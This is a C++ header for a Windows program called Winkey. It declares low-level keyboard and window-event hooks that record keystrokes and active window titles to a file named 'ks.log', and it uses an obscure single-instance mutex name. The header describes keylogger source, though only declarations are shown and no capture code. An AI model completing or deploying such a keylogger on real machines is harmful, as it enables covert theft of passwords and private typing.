#ifndef WINKEY_H
# define WINKEY_H

# define UNICODE				// Use the wide-character (UTF-16) versions of APIs by default
# define _UNICODE				// tell C/C++ runtime and some helper macros to use wchar functions

# define WIN32_LEAN_AND_MEAN	// Reduces the number of included headers for
								// faster compile times; warnings may increase without it
# include <windows.h>
# include <iostream>
# include <fstream>
# include <string>
# include <iomanip>				// For std::setw and std::setfill
# include <thread>				// For sleep_for

# include <locale>				// For wide characters
# include <codecvt>


/************************** Macros **************************/

# define TW_MUTEX_NAME		"TYYghhTYU5678FuGHFGFHYFUIY67"
# define TW_LOGFILE			"ks.log"

# define TW_MAX_SAME_VK		10	// Max amount of repetitive vkCode
# define TW_WINTITLE_MAX	256
# define TW_KEYSTROKE_MAX	64


/************************** Class **************************/

class	Winkey
{
	public:

		Winkey();
		// Delete the copy constructor
		Winkey(const Winkey&) = delete;
		// Delete the copy assignment operator
		Winkey	&operator=(const Winkey&) = delete;
		~Winkey();

		void	run(bool testMode);

	private:

		void					setHooks();
		static void				logToFile();

		static LRESULT CALLBACK	lowLevelKeyboardProc(
			const int nCode, const WPARAM wParam, const LPARAM lParam
		);
		static void CALLBACK	winEventProc(
			const HWINEVENTHOOK /*hWinEventHook*/, const DWORD event, const HWND hwnd,
			LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
		);

		static bool				_testMode;
		static const char		*_logFileName;
		static std::wofstream	_logFile;
		static std::wstring		_windowTitle;
		static HWND				_currentWindow;
		static std::wstring		_keyStroke;
		HANDLE					_singleInstanceMutex;
		HWINEVENTHOOK			_winEventHook;
		HHOOK   				_keyboardHook;
};


/************************** Exceptions **************************/

class	InstanceAlreadyRunnningException: public std::exception {
	public:
		InstanceAlreadyRunnningException() noexcept {}
		virtual const char	*what() const noexcept {
			return "Another instance of this program is already running.";
		}
		virtual ~InstanceAlreadyRunnningException() noexcept {}
};

class	FileOpenFailureException: public std::exception {
	public:
		FileOpenFailureException() noexcept {}
		virtual const char	*what() const noexcept {
			return "Failed to open log file.";
		}
		virtual ~FileOpenFailureException() noexcept {}
};

class	HookSettingFailureException: public std::exception {
	public:
		HookSettingFailureException() {}
		virtual const char	*what() const noexcept {
			return "Failed to set event hook.";
		}
		virtual ~HookSettingFailureException() noexcept {}
	private:
		const char	*_msg;
};


/************************** External Functions **************************/

std::wstring	getKeyName(const UINT vkCode);
bool			isPrintable(wchar_t c);

#endif
